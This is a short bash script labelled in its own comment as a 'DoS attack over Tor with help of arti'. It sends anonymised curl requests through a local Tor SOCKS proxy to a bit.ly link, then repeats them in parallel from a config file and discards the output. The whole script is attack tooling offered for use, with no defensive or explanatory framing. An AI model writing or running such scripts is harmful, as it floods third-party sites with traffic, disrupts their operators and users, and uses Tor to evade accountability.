#! /usr/bin/env bash

# DoS attack over Tor with help of arti
#
curl  -s -o /dev/null -w "%{http_code}" --socks5-hostname localhost:9150 https://bit.ly/you-are-smart-43

# website.txt
# CONTENTS
#
# url = https://bit.ly/you-are-smart-43
# output = /dev/null
# url = https://bit.ly/you-are-smart-43
# output = /dev/null

curl -s -o /dev/null -w "%{http_code}\n" --parallel --parallel-immediate --parallel-max 3 --config website.txt --socks5-hostname localhost:9150
